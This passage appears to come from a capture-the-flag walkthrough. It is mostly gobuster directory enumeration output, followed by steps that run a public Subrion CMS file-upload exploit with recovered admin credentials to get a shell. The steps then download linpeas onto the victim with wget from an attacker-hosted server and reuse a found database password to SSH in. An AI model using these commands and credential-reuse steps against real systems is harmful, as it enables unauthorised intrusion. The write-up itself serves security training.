/scheduling (Status: 301)
/schedule (Status: 301)
/schemes (Status: 301)
/schema (Status: 301)
/schemas (Status: 301)
/school (Status: 301)
/science (Status: 301)
/schools (Status: 301)
/scr (Status: 301)
/scope (Status: 301)
/S (Status: 302)
/scratc (Status: 301)
/screen (Status: 301)
/screens (Status: 301)
/screenshot (Status: 301)
/scripte (Status: 301)
/script (Status: 301)
/scriptlets (Status: 301)
/s (Status: 302)
/scriptlibrary (Status: 301)
/screenshots (Status: 301)
/scriptresource (Status: 301)
/scriptlet (Status: 301)
/search (Status: 301)
/scripts (Status: 301)
/sdk (Status: 301)
/sd (Status: 301)
/se (Status: 301)
/search_results (Status: 301)
/Scripts (Status: 301)
/searchnx (Status: 301)
/Search (Status: 301)
/searchresults (Status: 301)
/search-results (Status: 301)
/search_result (Status: 301)
/sec (Status: 301)
/seccode (Status: 301)
/searchurl (Status: 301)
/second (Status: 301)
/secondary (Status: 301)
/section (Status: 301)
/secrets (Status: 301)
/secret (Status: 301)
/secure (Status: 301)
/sections (Status: 301)
/secure_login (Status: 301)
/secured (Status: 301)
/secureauth (Status: 301)
/secureform (Status: 301)
/secureprocess (Status: 301)
/selection (Status: 301)
/selected (Status: 301)
/select (Status: 301)
/seed (Status: 301)
/Security (Status: 301)
/securimage (Status: 301)
/security (Status: 301)
/selectaddress (Status: 301)
/self (Status: 301)
/sell (Status: 301)
/send_order (Status: 301)
/seminar (Status: 301)
/send_pwd (Status: 301)
/seminars (Status: 301)
/send_to_friend (Status: 301)
/send (Status: 301)
/sem (Status: 301)
/sendform (Status: 301)
/sendmail (Status: 301)
/sendmessage (Status: 301)
/sendfriend (Status: 301)
/send-password (Status: 301)
/sendto (Status: 301)
/sendthread (Status: 301)
/sendpm (Status: 301)
/sendtofriend (Status: 301)
/sent (Status: 301)
/sensepost (Status: 301)
/sensor (Status: 301)
/serial (Status: 301)
/seo (Status: 301)
/serv (Status: 301)
/serve (Status: 301)
/Server (Status: 301)
/server (Status: 301)
/ServerAdministrator (Status: 301)
/server_stats (Status: 301)
/SERVER-INF (Status: 301)
/server_admin_small (Status: 301)
/server-info (Status: 301)
/service (Status: 301)
/servers (Status: 301)
/server-status (Status: 301)
/servicelist (Status: 301)
/services (Status: 301)
/Services (Status: 301)
/servicio (Status: 301)
/servicios (Status: 301)
/servlet (Status: 301)
/Servlet (Status: 301)
/Servlets (Status: 301)
/servlets (Status: 301)
/servlets-examples (Status: 301)
/sess (Status: 301)
/session (Status: 301)
/sessionid (Status: 301)
/sessionlist (Status: 301)
/sf (Status: 301)
/sex (Status: 301)
/setting (Status: 301)
/setcurrency (Status: 301)
/setvatsetting (Status: 301)
/set (Status: 301)
/settings (Status: 301)
/sessions (Status: 301)
/setup (Status: 301)
/setlocale (Status: 301)
/sg (Status: 301)
/sh (Status: 301)
/shadow (Status: 301)
/shared (Status: 301)
/shares (Status: 301)
/ship (Status: 301)
/shim (Status: 301)
/shaken (Status: 301)
/shell (Status: 301)
/share (Status: 301)
/shipquote (Status: 301)
/shit (Status: 301)
/shockwave (Status: 301)
/shippinginfo (Status: 301)
/shop (Status: 301)
/shipping (Status: 301)
/shipped (Status: 301)
/shipping_help (Status: 301)
/shop_closed (Status: 301)
/shop_content (Status: 301)
/shopper (Status: 301)
/shopadmin (Status: 301)
/shopping_cart (Status: 301)
/shopping (Status: 301)
/shops_buyaction (Status: 301)
/shopsys (Status: 301)
/shoppingcart (Status: 301)
/shopping-lists (Status: 301)
/shopstat (Status: 301)
/shops (Status: 301)
/shoutbox (Status: 301)
/showallsites (Status: 301)
/show_thread (Status: 301)
/show (Status: 301)
/show_post (Status: 301)
/showcase (Status: 301)
/showcat (Status: 301)
/showenv (Status: 301)
/showgroups (Status: 301)
/showcode (Status: 301)
/showjobs (Status: 301)
/showlogin (Status: 301)
/showmsg (Status: 301)
/showkey (Status: 301)
/showmap (Status: 301)
/showroom (Status: 301)
/showpost (Status: 301)
/shows (Status: 301)
/shtml (Status: 301)
/showthread (Status: 301)
/si (Status: 301)
/sid (Status: 301)
/sign (Status: 301)
/sign_up (Status: 301)
/signature (Status: 301)
/signaturepics (Status: 301)
/signer (Status: 301)
/signed (Status: 301)
/signin (Status: 301)
/signing (Status: 301)
/signout (Status: 301)
/signup (Status: 301)
/sign-up (Status: 301)
/signon (Status: 301)
/signoff (Status: 301)
/simple (Status: 301)
/simplelogin (Status: 301)
/simpleLogin (Status: 301)
/single (Status: 301)
/single_pages (Status: 301)
/sitebuilder (Status: 301)
/sink (Status: 301)
/site (Status: 301)
/site_map (Status: 301)
/siteadmin (Status: 301)
/sitecore (Status: 301)
/sitefiles (Status: 301)
/sitemap (Status: 301)
/siteimages (Status: 301)
/site-map (Status: 301)
/SiteMap (Status: 301)
/sitemaps (Status: 301)
/sitemgr (Status: 301)
/sites (Status: 301)
/Sites (Status: 301)
/SiteScope (Status: 301)
/sitesearch (Status: 301)
/SiteServer (Status: 301)
/sk (Status: 301)
/skel (Status: 301)
/skin (Status: 301)
/skin1 (Status: 301)
/skin1_original (Status: 301)
/skins (Status: 301)
/sl (Status: 301)
/skip (Status: 301)
/slabel (Status: 301)
/slide_show (Status: 301)
/slashdot (Status: 301)
/slides (Status: 301)
/slimstat (Status: 301)
/sling (Status: 301)
/slideshow (Status: 301)
/sm (Status: 301)
/sitemap.xml (Status: 200)
/small (Status: 301)
/smblogin (Status: 301)
/smarty (Status: 301)
/smb (Status: 301)
/smf (Status: 301)
/smile (Status: 301)
/smiles (Status: 301)
/smileys (Status: 301)
/sms (Status: 301)
/smilies (Status: 301)
/snp (Status: 301)
/so (Status: 301)
/smtp (Status: 301)
/snoop (Status: 301)
/snippets (Status: 301)
/soapdocs (Status: 301)
/SOAPMonitor (Status: 301)
/soap (Status: 301)
/soaprouter (Status: 301)
/social (Status: 301)
/soft (Status: 301)
/software (Status: 301)
/Software (Status: 301)
/sohoadmin (Status: 301)
/sold (Status: 301)
/solaris (Status: 301)
/solution (Status: 301)
/solutions (Status: 301)
/sitemap.gz (Status: 302)
/sounds (Status: 301)
/sound (Status: 301)
/sort (Status: 301)
/songs (Status: 301)
/soporte (Status: 301)
/sony (Status: 301)
/somebody (Status: 301)
/solve (Status: 301)
/solved (Status: 301)
/source (Status: 301)
/sources (Status: 301)
/sox (Status: 301)
/Sources (Status: 301)
/spain (Status: 301)
/space (Status: 301)
/sp (Status: 301)
/spam (Status: 301)
/spanish (Status: 301)
/speakers (Status: 301)
/spaw (Status: 301)
/special_offers (Status: 301)
/specials (Status: 301)
/spec (Status: 301)
/specified (Status: 301)
/spacer (Status: 301)
/specs (Status: 301)
/speedtest (Status: 301)
/splash (Status: 301)
/spider (Status: 301)
/spiders (Status: 301)
/sphider (Status: 301)
/sponsors (Status: 301)
/sponsor (Status: 301)
/spool (Status: 301)
/sport (Status: 301)
/sports (Status: 301)
/spotlight (Status: 301)
/Sports (Status: 301)
/spellchecker (Status: 301)
/special (Status: 301)
/Spy (Status: 301)
/spryassets (Status: 301)
/sql-admin (Status: 301)
/sqlmanager (Status: 301)
/spyware (Status: 301)
/squelettes (Status: 301)
/squelettes-dist (Status: 301)
/sq (Status: 301)
/SQL (Status: 301)
/sr (Status: 301)
/sql (Status: 301)
/sqladmin (Status: 301)
/sqlnet (Status: 301)
/sqlweb (Status: 301)
/ss (Status: 301)
/ssh (Status: 301)
/ssfm (Status: 301)
/ss_vms_admin_sm (Status: 301)
/srchad (Status: 301)
/squirrel (Status: 301)
/srv (Status: 301)
/src (Status: 301)
/squirrelmail (Status: 301)
/spamlog.log (Status: 302)
/sshadmin (Status: 301)
/ssi (Status: 301)
/sso (Status: 301)
/ssl (Status: 301)
/st (Status: 301)
/ssp_director (Status: 301)
/sslvpn (Status: 301)
/ssn (Status: 301)
/stackdump (Status: 301)
/ssl_check (Status: 301)
/staff (Status: 301)
/staffs (Status: 301)
/standalone (Status: 301)
/star (Status: 301)
/stage (Status: 301)
/staff_directory (Status: 301)
/staging (Status: 301)
/standard (Status: 301)
/stale (Status: 301)
/startpage (Status: 301)
/standards (Status: 301)
/starter (Status: 301)
/stat (Status: 301)
/staradmin (Status: 301)
/start (Status: 301)
/statements (Status: 301)
/states (Status: 301)
/statement (Status: 301)
/state (Status: 301)
/static (Status: 301)
/statistik (Status: 301)
/statistic (Status: 301)
/statistics (Status: 301)
/Statistics (Status: 301)
/staticpages (Status: 301)
/Stats (Status: 301)
/status (Status: 301)
/stats (Status: 301)
/statusicon (Status: 301)
/statshistory (Status: 301)
/stoneedge (Status: 301)
/stock (Status: 301)
/storage (Status: 301)
/store (Status: 301)
/store_closed (Status: 301)
/stores (Status: 301)
/stored (Status: 301)
/stories (Status: 301)
/stop (Status: 301)
/story (Status: 301)
/stream (Status: 301)
/stow (Status: 301)
/string (Status: 301)
/strategy (Status: 301)
/strut (Status: 301)
/student (Status: 301)
/struts (Status: 301)
/students (Status: 301)
/studio (Status: 301)
/stuff (Status: 301)
/style (Status: 301)
/style_captcha (Status: 301)
/style_css (Status: 301)
/style_avatars (Status: 301)
/subject (Status: 301)
/submenus (Status: 301)
/sub-login (Status: 301)
/subdomains (Status: 301)
/style_images (Status: 301)
/sub (Status: 301)
/stylesheets (Status: 301)
/stylesheet (Status: 301)
/styles (Status: 301)
/style_emoticons (Status: 301)
/submit (Status: 301)
/submissions (Status: 301)
/subs (Status: 301)
/subscriber (Status: 301)
/subscribers (Status: 301)
/subscriptions (Status: 301)
/subscription (Status: 301)
/subscribed (Status: 301)
/subscribe (Status: 301)
/submitter (Status: 301)
/suite (Status: 301)
/suggest (Status: 301)
/suffix (Status: 301)
/sucontact (Status: 301)
/suggest-listing (Status: 301)
/sun (Status: 301)
/summary (Status: 301)
/suites (Status: 301)
/SUNWmc (Status: 301)
/success (Status: 301)
/suche (Status: 301)
/sunos (Status: 301)
/Super-Admin (Status: 301)
/super (Status: 301)
/support (Status: 301)
/support_login (Status: 301)
/surf (Status: 301)
/supplier (Status: 301)
/surveys (Status: 301)
/Support (Status: 301)
/suupgrade (Status: 301)
/supported (Status: 301)
/survey (Status: 301)
/svr (Status: 301)
/svn (Status: 301)
/sv (Status: 301)
/sw (Status: 301)
/svn-base (Status: 301)
/svc (Status: 301)
/swf (Status: 301)
/swajax1 (Status: 301)
/swfs (Status: 301)
/sws (Status: 301)
/switch (Status: 301)
/sync (Status: 301)
/syndication (Status: 301)
/synapse (Status: 301)
/synced (Status: 301)
/sysadmin (Status: 301)
/sys (Status: 301)
/sys-admin (Status: 301)
/SysAdmin (Status: 301)
/sysadmin2 (Status: 301)
/sysadmins (Status: 301)
/SysAdmin2 (Status: 301)
/sysmanager (Status: 301)
/system (Status: 301)
/system_admin (Status: 301)
/system_administration (Status: 301)
/system_web (Status: 301)
/system-admin (Status: 301)
/system-administration (Status: 301)
/systems (Status: 301)
/sysuser (Status: 301)
/szukaj (Status: 301)
/t1 (Status: 301)
/table (Status: 301)
/tabs (Status: 301)
/tag (Status: 301)
/tagline (Status: 301)
/t3lib (Status: 301)
/tags (Status: 301)
/tail (Status: 301)
/talk (Status: 301)
/tapestry (Status: 301)
/talks (Status: 301)
/tapes (Status: 301)
/tape (Status: 301)
/tar (Status: 301)
/tartarus (Status: 301)
/task (Status: 301)
/taxonomy (Status: 301)
/target (Status: 301)
/suspended.page (Status: 302)
/tb (Status: 301)
/te (Status: 301)
/tech (Status: 301)
/team (Status: 301)
/technical (Status: 301)
/technology (Status: 301)
/tel (Status: 301)
/T (Status: 302)
/Technology (Status: 301)
/tele (Status: 301)
/tell_friend (Status: 301)
/tell_a_friend (Status: 301)
/television (Status: 301)
/tellafriend (Status: 301)
/temaoversikt (Status: 301)
/templ (Status: 301)
/temp (Status: 301)
/TEMP (Status: 301)
/template (Status: 301)
/templates_c (Status: 301)
/tar.gz (Status: 302)
/tar.bz2 (Status: 302)
/temporal (Status: 301)
/templets (Status: 301)
/temporary (Status: 301)
/terminal (Status: 301)
/term (Status: 301)
/templates (Status: 301)
/temps (Status: 301)
/terms (Status: 301)
/terms_privacy (Status: 301)
/test (Status: 301)
/terms-of-use (Status: 301)
/termsofuse (Status: 301)
/terrorism (Status: 301)
/test_db (Status: 301)
/test1234 (Status: 301)
/t (Status: 302)
/tcl (Status: 301)
/tasks (Status: 301)
/test1 (Status: 301)
/test3 (Status: 301)
/test123 (Status: 301)
/test2 (Status: 301)
/testimonials (Status: 301)
/test-cgi (Status: 301)
/testing (Status: 301)
/testimonial (Status: 301)
/test-env (Status: 301)
/text-base (Status: 301)
/textpattern (Status: 301)
/texts (Status: 301)
/tests (Status: 301)
/tgz (Status: 301)
/th (Status: 301)
/thanks (Status: 301)
/text (Status: 301)
/thank-you (Status: 301)
/the (Status: 301)
/theme (Status: 301)
/teste (Status: 301)
/texis (Status: 301)
/Themes (Status: 301)
/third-party (Status: 301)
/thickbox (Status: 301)
/threadrate (Status: 301)
/testsite (Status: 301)
/textobject (Status: 301)
/threads (Status: 301)
/threadtag (Status: 301)
/thumb (Status: 301)
/this (Status: 301)
/thankyou (Status: 301)
/tgp (Status: 301)
/themes (Status: 301)
/thread (Status: 301)
/thumbnail (Status: 301)
/thumbs (Status: 301)
/thumbnails (Status: 301)
/ticket_list (Status: 301)
/ticket (Status: 301)
/ticket_new (Status: 301)
/tickets (Status: 301)
/tienda (Status: 301)
/tiki (Status: 301)
/tiles (Status: 301)
/time (Status: 301)
/thumbs.db (Status: 302)
/Thumbs.db (Status: 302)
/title (Status: 301)
/tips (Status: 301)
/tip (Status: 301)
/tinymce (Status: 301)
/tiny_mce (Status: 301)
/timeline (Status: 301)
/tmp (Status: 301)
/tls (Status: 301)
/titles (Status: 301)
/tl (Status: 301)
/to (Status: 301)
/tn (Status: 301)
/tncms (Status: 301)
/tmps (Status: 301)
/tmpl (Status: 301)
/TMP (Status: 301)
/todel (Status: 301)
/todo (Status: 301)
/today (Status: 301)
/toc (Status: 301)
/toggle (Status: 301)
/tomcat (Status: 301)
/tool (Status: 301)
/tomcat-docs (Status: 301)
/toolbar (Status: 301)
/top (Status: 301)
/TODO (Status: 301)
/top1 (Status: 301)
/topic (Status: 301)
/topicadmin (Status: 301)
/toplist (Status: 301)
/toplists (Status: 301)
/topnav (Status: 301)
/topics (Status: 301)
/topsites (Status: 301)
/torrent (Status: 301)
/torrents (Status: 301)
/tos (Status: 301)
/tours (Status: 301)
/tour (Status: 301)
/toys (Status: 301)
/tpl (Status: 301)
/tp (Status: 301)
/tpv (Status: 301)
/tooltip (Status: 301)
/tr (Status: 301)
/trace (Status: 301)
/trac (Status: 301)
/traceroute (Status: 301)
/traces (Status: 301)
/track (Status: 301)
/trackback (Status: 301)
/trackclick (Status: 301)
/tracker (Status: 301)
/trackers (Status: 301)
/tracking (Status: 301)
/trackpackage (Status: 301)
/trade (Status: 301)
/tracks (Status: 301)
/trademarks (Status: 301)
/traffic (Status: 301)
/trailer (Status: 301)
/training (Status: 301)
/trailers (Status: 301)
/tools (Status: 301)
/toolkit (Status: 301)
/transparent (Status: 301)
/translations (Status: 301)
/transformations (Status: 301)
/transfer (Status: 301)
/transactions (Status: 301)
/translate (Status: 301)
/transaction (Status: 301)
/trans (Status: 301)
/transport (Status: 301)
/travel (Status: 301)
/trends (Status: 301)
/trial (Status: 301)
/true (Status: 301)
/tree (Status: 301)
/tslib (Status: 301)
/Travel (Status: 301)
/trees (Status: 301)
/tt (Status: 301)
/trap (Status: 301)
/turbine (Status: 301)
/treasury (Status: 301)
/trash (Status: 301)
/tutorials (Status: 301)
/tw (Status: 301)
/tuning (Status: 301)
/tuscany (Status: 301)
/tsweb (Status: 301)
/twiki (Status: 301)
/twitter (Status: 301)
/tutorial (Status: 301)
/twatch (Status: 301)
/trunk (Status: 301)
/tv (Status: 301)
/typo3_src (Status: 301)
/typo3 (Status: 301)
/tx (Status: 301)
/type (Status: 301)
/txt (Status: 301)
/typo3conf (Status: 301)
/tweak (Status: 301)
/typo3temp (Status: 301)
/typolight (Status: 301)
/ua (Status: 301)
/ubb (Status: 301)
/uc (Status: 301)
/ucenter (Status: 301)
/uc_client (Status: 301)
/uc_server (Status: 301)
/ucp (Status: 301)
/uddi (Status: 301)
/uds (Status: 301)
/ui (Status: 301)
/umbraco (Status: 301)
/umbraco_client (Status: 301)
/umts (Status: 301)
/uncategorized (Status: 301)
/uk (Status: 301)
/under_update (Status: 301)
/uninstall (Status: 301)
/unix (Status: 301)
/union (Status: 301)
/unpaid (Status: 301)
/unregister (Status: 301)
/unlock (Status: 301)
/unreg (Status: 301)
/unsafe (Status: 301)
/unsubscribe (Status: 301)
/up (Status: 301)
/unused (Status: 301)
/upcoming (Status: 301)
/update (Status: 301)
/upd (Status: 301)
/updated (Status: 301)
/updateinstaller (Status: 301)
/updater (Status: 301)
/updates-topic (Status: 301)
/upgrade (Status: 301)
/upload (Status: 301)
/U (Status: 302)
/upload_file (Status: 301)
/upload_files (Status: 301)
/uploadedfiles (Status: 301)
/uploaded (Status: 301)
/uploadfile (Status: 301)
/uploadedimages (Status: 301)
/uploader (Status: 301)
/urls (Status: 301)
/u (Status: 302)
/uploadfiles (Status: 301)
/urchin (Status: 301)
/ur-admin (Status: 301)
/url (Status: 301)
/US (Status: 301)
/updates (Status: 403)
/urlrewriter (Status: 301)
/usage (Status: 301)
/usa (Status: 301)
/user_upload (Status: 301)
/userapp (Status: 301)
/user (Status: 301)
/useradmin (Status: 301)
/userfiles (Status: 301)
/usercontrols (Status: 301)
/us (Status: 301)
/usercp2 (Status: 301)
/uploads (Status: 301)
/userinfo (Status: 301)
/usercp (Status: 301)
/usermanager (Status: 301)
/userimages (Status: 301)
/userdir (Status: 301)
/UserFiles (Status: 301)
/userlog (Status: 301)
/userlist (Status: 301)
/usernote (Status: 301)
/username (Status: 301)
/userlogin (Status: 301)
/users (Status: 301)
/usr (Status: 301)
/usernames (Status: 301)
/usrmgr (Status: 301)
/ustats (Status: 301)
/usuarios (Status: 301)
/util (Status: 301)
/usuario (Status: 301)
/usrs (Status: 301)
/Utilities (Status: 301)
/utilities (Status: 301)
/utility (Status: 301)
/utility_login (Status: 301)
/upgrade.readme (Status: 302)
/v1 (Status: 301)
/v3 (Status: 301)
/utils (Status: 301)
/vadmind (Status: 301)
/validatior (Status: 301)
/v2 (Status: 301)
/v4 (Status: 301)
/validation (Status: 301)
/vap (Status: 301)
/var (Status: 301)
/vault (Status: 301)
/vb (Status: 301)
/vbscript (Status: 301)
/vbs (Status: 301)
/vbmodcp (Status: 301)
/vbscripts (Status: 301)
/vbseo (Status: 301)
/vcss (Status: 301)
/vbseocp (Status: 301)
/vdsbackup (Status: 301)
/vector (Status: 301)
/vehicle (Status: 301)
/vehiclequote (Status: 301)
/vehiclemakeoffer (Status: 301)
/vehicletestdrive (Status: 301)
/velocity (Status: 301)
/vendor (Status: 301)
/ver (Status: 301)
/vendors (Status: 301)
/ver2 (Status: 301)
/venda (Status: 301)
/ver1 (Status: 301)
/version (Status: 301)
/verwaltung (Status: 301)
/video (Status: 301)
/vi (Status: 301)
/vfs (Status: 301)
/viagra (Status: 301)
/vid (Status: 301)
/videos (Status: 301)
/Video (Status: 301)
/view (Status: 301)
/viewcvs (Status: 301)
/viewcart (Status: 301)
/viewer (Status: 301)
/view_cart (Status: 301)
/viewfile (Status: 301)
/viewonline (Status: 301)
/v (Status: 302)
/viewforum (Status: 301)
/viewlogin (Status: 301)
/viewsvn (Status: 301)
/views (Status: 301)
/V (Status: 302)
/view-source (Status: 301)
/viewsource (Status: 301)
/viewvc (Status: 301)
/viewthread (Status: 301)
/virus (Status: 301)
/visit (Status: 301)
/viewtopic (Status: 301)
/vip (Status: 301)
/visitor (Status: 301)
/vista (Status: 301)
/visitormessage (Status: 301)
/vm (Status: 301)
/vmailadmin (Status: 301)
/voip (Status: 301)
/vol (Status: 301)
/virtual (Status: 301)
/void (Status: 301)
/volunteer (Status: 301)
/voted (Status: 301)
/votes (Status: 301)
/voter (Status: 301)
/vpg (Status: 301)
/vote (Status: 301)
/vp (Status: 301)
/vpn (Status: 301)
/vsadmin (Status: 301)
/vuln (Status: 301)
/w3c (Status: 301)
/vs (Status: 301)
/vvc_display (Status: 301)
/w3svc (Status: 301)
/wa (Status: 301)
/w3 (Status: 301)
/W3SVC2 (Status: 301)
/W3SVC1 (Status: 301)
/W3SVC (Status: 301)
/W3SVC3 (Status: 301)
/wallpaper (Status: 301)
/wap (Status: 301)
/wallpapers (Status: 301)
/war (Status: 301)
/warenkorb (Status: 301)
/warez (Status: 301)
/warn (Status: 301)
/way-board (Status: 301)
/wbboard (Status: 301)
/wbsadmin (Status: 301)
/wc (Status: 301)
/wcs (Status: 301)
/weather (Status: 301)
/wdav (Status: 301)
/web (Status: 301)
/web1 (Status: 301)
/web_users (Status: 301)
/web2 (Status: 301)
/webadm (Status: 301)
/webaccess (Status: 301)
/web3 (Status: 301)
/WebAdmin (Status: 301)
/webadmin (Status: 301)
/webagent (Status: 301)
/webalizer (Status: 301)
/webapp (Status: 301)
/webapps (Status: 301)
/webb (Status: 301)
/web-beans (Status: 301)
/webbbs (Status: 301)
/webboard (Status: 301)
/webcalendar (Status: 301)
/webcam (Status: 301)
/w (Status: 302)
/W (Status: 302)
/webcast (Status: 301)
/web-console (Status: 301)
/webctrl_client (Status: 301)
/webcasts (Status: 301)
/webcgi (Status: 301)
/webcharts (Status: 301)
/webchat (Status: 301)
/webdb (Status: 301)
/webdav (Status: 301)
/webcart (Status: 301)
/webdist (Status: 301)
/webedit (Status: 301)
/webdata (Status: 301)
/webhits (Status: 301)
/web-inf (Status: 301)
/webfm_send (Status: 301)
/webim (Status: 301)
/WEB-INF (Status: 301)
/web.config (Status: 302)
/weblog (Status: 301)
/weblogs (Status: 301)
/weblogic (Status: 301)
/webmaster (Status: 301)
/webinar (Status: 301)
/webmail (Status: 301)
/web.xml (Status: 302)
/webplus (Status: 301)
/webmasters (Status: 301)
/webpages (Status: 301)
/webresource (Status: 301)
/websearch (Status: 301)
/website (Status: 301)
/webshop (Status: 301)
/websites (Status: 301)
/webservice (Status: 301)
/webservices (Status: 301)
/webstats (Status: 301)
/webstat (Status: 301)
/websql (Status: 301)
/websphere (Status: 301)
/websvn (Status: 301)
/wedding (Status: 301)
/webtrends (Status: 301)
/webusers (Status: 301)
/welcome (Status: 301)
/webvpn (Status: 301)
/weekly (Status: 301)
/wellcome (Status: 301)
/week (Status: 301)
/werbung (Status: 301)
/wget (Status: 301)
/webwork (Status: 301)
/well (Status: 301)
/whatsnew (Status: 301)
/whatever (Status: 301)
/what (Status: 301)
/white (Status: 301)
/whitepapers (Status: 301)
/whitepaper (Status: 301)
/wicket (Status: 301)
/who (Status: 301)
/whois (Status: 301)
/whatnot (Status: 301)
/wholesale (Status: 301)
/wifi (Status: 301)
/wii (Status: 301)
/wide_search (Status: 301)
/widget (Status: 301)
/widgets (Status: 301)
/whosonline (Status: 301)
/why (Status: 301)
/wiki (Status: 301)
/will (Status: 301)
/win (Status: 301)
/winnt (Status: 301)
/wireless (Status: 301)
/win32 (Status: 301)
/wizmysqladmin (Status: 301)
/wml (Status: 301)
/Windows (Status: 301)
/word (Status: 301)
/wordpress (Status: 301)
/with (Status: 301)
/wink (Status: 301)
/wishlist (Status: 301)
/wiz (Status: 301)
/workflowtasks (Status: 301)
/windows (Status: 301)
/wizard (Status: 301)
/works (Status: 301)
/work (Status: 301)
/wolthuis (Status: 301)
/world (Status: 301)
/workarea (Status: 301)
/workplace (Status: 301)
/worldpayreturn (Status: 301)
/workshops (Status: 301)
/workshop (Status: 301)
/worldwide (Status: 301)
/working (Status: 301)
/wp-blog-header (Status: 301)
/wpau-backup (Status: 301)
/wp-app (Status: 301)
/wp-atom (Status: 301)
/wp-admin (Status: 301)
/wp (Status: 301)
/wow (Status: 301)
/wp-content (Status: 301)
/wpcontent (Status: 301)
/wp-config (Status: 301)
/wp-commentsrss2 (Status: 301)
/wp-comments (Status: 301)
/wpcallback (Status: 301)
/wp-cron (Status: 301)
/wp-images (Status: 301)
/wp-dbmanager (Status: 301)
/wp-feed (Status: 301)
/wp-icludes (Status: 301)
/wp-includes (Status: 301)
/wp-links-opml (Status: 301)
/wp-login (Status: 301)
/wp-pass (Status: 301)
/wp-register (Status: 301)
/wp-load (Status: 301)
/wp-rss (Status: 301)
/wps (Status: 301)
/wp-rss2 (Status: 301)
/wp-syntax (Status: 301)
/wp-trackback (Status: 301)
/wp-signup (Status: 301)
/wp-mail (Status: 301)
/wrap (Status: 301)
/ws_ftp (Status: 301)
/wp-rdf (Status: 301)
/wp-settings (Status: 301)
/ws (Status: 301)
/writing (Status: 301)
/WS_FTP (Status: 301)
/ws-client (Status: 301)
/wsdl (Status: 301)
/wss (Status: 301)
/wstat (Status: 301)
/wtai (Status: 301)
/wstats (Status: 301)
/wt (Status: 301)
/wusage (Status: 301)
/wwhelp (Status: 301)
/www (Status: 301)
/www1 (Status: 301)
/www2 (Status: 301)
/www3 (Status: 301)
/wwwboard (Status: 301)
/wwwlog (Status: 301)
/wwwjoin (Status: 301)
/wwwroot (Status: 301)
/www-sql (Status: 301)
/wwwstat (Status: 301)
/wwwthreads (Status: 301)
/wwwstats (Status: 301)
/wwwuser (Status: 301)
/wysiwyg (Status: 301)
/wysiwygpro (Status: 301)
/xajax_js (Status: 301)
/xalan (Status: 301)
/xbox (Status: 301)
/xcache (Status: 301)
/xcart (Status: 301)
/xd_receiver (Status: 301)
/xajax (Status: 301)
/xdb (Status: 301)
/xerces (Status: 301)
/xfer (Status: 301)
/xmas (Status: 301)
/xhtml (Status: 301)
/xlogin (Status: 301)
/xls (Status: 301)
/xml (Status: 301)
/XML (Status: 301)
/xmlimporter (Status: 301)
/xmlfiles (Status: 301)
/xml-rpc (Status: 301)
/xmlrpc_server (Status: 301)
/xsl (Status: 301)
/xmlrpc (Status: 301)
/xn (Status: 301)
/WS_FTP.LOG (Status: 302)
/xslt (Status: 301)
/xxx (Status: 301)
/xyz (Status: 301)
/xx (Status: 301)
/XXX (Status: 301)
/xsql (Status: 301)
/xyzzy (Status: 301)
/X (Status: 302)
/x (Status: 302)
/yahoo (Status: 301)
/year (Status: 301)
/yearly (Status: 301)
/yonetici (Status: 301)
/yonetim (Status: 301)
/yesterday (Status: 301)
/yml (Status: 301)
/yshop (Status: 301)
/yt (Status: 301)
/youtube (Status: 301)
/yui (Status: 301)
/zap (Status: 301)
/zend (Status: 301)
/zero (Status: 301)
/zencart (Status: 301)
/zeus (Status: 301)
/zh (Status: 301)
/zboard (Status: 301)
/xmlrpc.php (Status: 302)
/zip (Status: 301)
/zh_TW (Status: 301)
/zh_CN (Status: 301)
/zipfiles (Status: 301)
/zh-cn (Status: 301)
/xmlrpc_server.php (Status: 302)
/z (Status: 302)
/y (Status: 302)
/zones (Status: 301)
/zoom (Status: 301)
/zone (Status: 301)
/zope (Status: 301)
/zoeken (Status: 301)
/zimbra (Status: 301)
/zips (Status: 301)
/zh-tw (Status: 301)
/zt (Status: 301)
/zorum (Status: 301)
===============================================================
2022/04/17 04:31:22 Finished
===============================================================
```

7. Try to login with the credentials we found, but it doesn't work. The hint tells us that it's `[cooked with magical formula]`. Use the cyberchef `Magic` option to get `Scam2021` and login.
8. Download the [arbitrary file upload exploit](https://www.exploit-db.com/exploits/49876) for Subrion and run it with `python3 exploit.py -u http://10.10.67.176/subrion/panel/ -l admin -p Scam2021` to get a shell
9. Download linpeas on your machine, host a http server with python `python3 -m http.server`, and download it onto the victim machine with wget. Give it executable permissions with `chmod 777 <file>` and run it
10. Linpeas finds the wordpress database password `ImAScammerLOL!123!`. Try to ssh into root with it, but it doesn't work. Try `scamsite` user and we get a shell.
```
$ ./linpeas.sh


                            \u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584
                    \u2584\u2584\u2584\u2584\u2584\u2584\u2584             \u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584
             \u2584\u2584\u2584\u2584\u2584\u2584\u2584      \u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584  \u2584\u2584\u2584\u2584
         \u2584\u2584\u2584\u2584     \u2584 \u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584 \u2584\u2584\u2584\u2584\u2584\u2584
         \u2584    \u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584
         \u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584 \u2584\u2584\u2584\u2584\u2584       \u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584
         \u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584          \u2584\u2584\u2584\u2584\u2584\u2584               \u2584\u2584\u2584\u2584\u2584\u2584 \u2584
         \u2584\u2584\u2584\u2584\u2584\u2584              \u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584                 \u2584\u2584\u2584\u2584
         \u2584\u2584                  \u2584\u2584\u2584 \u2584\u2584\u2584\u2584\u2584                  \u2584\u2584\u2584
